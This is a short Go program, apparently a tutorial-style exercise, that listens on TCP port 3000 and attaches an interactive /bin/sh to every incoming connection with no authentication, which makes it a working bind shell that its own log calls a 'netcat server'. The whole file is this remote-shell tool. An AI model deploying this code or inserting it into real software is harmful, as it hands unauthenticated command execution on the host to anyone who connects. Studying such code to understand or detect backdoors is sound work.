package main

import (
	"bufio"
	"io"
	"log"
	"net"
	"os/exec"
)

// Flusher wraps the bufio.Writer instance
type Flusher struct {
	w *bufio.Writer
}

// NewFlusher creates new Flusher from io.Writer instance for writing
func NewFlusher(b io.Writer) *Flusher {
	return &Flusher{
		w: bufio.NewWriter(b),
	}
}

// write Writes data and flushes explicity
func (foo *Flusher) Write(b []byte) (int, error) {
	count, err := foo.w.Write(b)
	if err != nil {
		return -1, err
	}
	if err := foo.w.Flush(); err != nil {
		return -1, err
	}
	return count, err
}

//handle gives access to each connection a bash :)
func handle(conn net.Conn) {
	//Explictly calling /bin/sh and using -i for interactive mode
	// so that we can use it for stdin and stdout
	cmd := exec.Command("/bin/sh", "-i")
	// Set stdin to our connection
	rp, wp := io.Pipe()
	cmd.Stdin = conn
	cmd.Stdout = wp

	go io.Copy(conn, rp)
	cmd.Run()
	conn.Close()
}
func main() {
	// Setup the listener at port 3000
	listener, err := net.Listen("tcp", ":3000")
	if err != nil {
		log.Fatalln("Unable to bind the port 3000")
	}
	log.Println("netcat server started at port 3000")
	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatalln("unable to accept connection")
		}
		// create the handler for each incomming connection
		go handle(conn)
	}

}
